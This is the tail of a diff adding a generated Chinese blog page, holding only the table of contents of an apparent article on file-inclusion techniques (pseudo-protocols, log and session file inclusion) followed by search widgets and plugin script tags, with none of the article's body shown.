class="trm-toc-text">JAVA 环境</span></a></li><li class="trm-toc-item trm-toc-level-4" title="ASP .NET环境"><a rel="nofollow" class="trm-toc-link" href="#ASP-NET环境"><span class="trm-toc-number">1.1.1.3.</span> <span class="trm-toc-text">ASP .NET环境</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-3" title="黑盒发现"><a rel="nofollow" class="trm-toc-link" href="#黑盒发现"><span class="trm-toc-number">1.1.2.</span> <span class="trm-toc-text">黑盒发现</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="是否有文件上传"><a rel="nofollow" class="trm-toc-link" href="#是否有文件上传"><span class="trm-toc-number">1.2.</span> <span class="trm-toc-text">是否有文件上传</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="无文件支持伪协议利用"><a rel="nofollow" class="trm-toc-link" href="#无文件支持伪协议利用"><span class="trm-toc-number">1.2.1.</span> <span class="trm-toc-text">无文件支持伪协议利用</span></a></li><li class="trm-toc-item trm-toc-level-3" title="文件读取:"><a rel="nofollow" class="trm-toc-link" href="#文件读取"><span class="trm-toc-number">1.2.2.</span> <span class="trm-toc-text">文件读取:</span></a></li><li class="trm-toc-item trm-toc-level-3" title="文件写入"><a rel="nofollow" class="trm-toc-link" href="#文件写入"><span class="trm-toc-number">1.2.3.</span> <span class="trm-toc-text">文件写入</span></a></li><li class="trm-toc-item trm-toc-level-3" title="代码执行"><a rel="nofollow" class="trm-toc-link" href="#代码执行"><span class="trm-toc-number">1.2.4.</span> <span class="trm-toc-text">代码执行</span></a></li><li class="trm-toc-item trm-toc-level-3" title="日志文件包含 如果php被过滤了且无法绕过"><a rel="nofollow" class="trm-toc-link" href="#日志文件包含-如果php被过滤了且无法绕过"><span class="trm-toc-number">1.2.5.</span> <span class="trm-toc-text">日志文件包含 如果php被过滤了且无法绕过</span></a></li><li class="trm-toc-item trm-toc-level-3" title="SESSION文件包含"><a rel="nofollow" class="trm-toc-link" href="#SESSION文件包含"><span class="trm-toc-number">1.2.6.</span> <span class="trm-toc-text">SESSION文件包含</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-4" title="配置"><a rel="nofollow" class="trm-toc-link" href="#配置"><span class="trm-toc-number">1.2.6.1.</span> <span class="trm-toc-text">配置</span></a></li><li class="trm-toc-item trm-toc-level-4" title="原理"><a rel="nofollow" class="trm-toc-link" href="#原理"><span class="trm-toc-number">1.2.6.2.</span> <span class="trm-toc-text">原理</span></a></li><li class="trm-toc-item trm-toc-level-4" title="操作"><a rel="nofollow" class="trm-toc-link" href="#操作"><span class="trm-toc-number">1.2.6.3.</span> <span class="trm-toc-text">操作</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="搜索文章...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    请输入关键词进行搜索
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.5"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="/js/plugins/local_search.js?v=2.2.5"></script>
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.2.5"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+</body>
+
+</html>
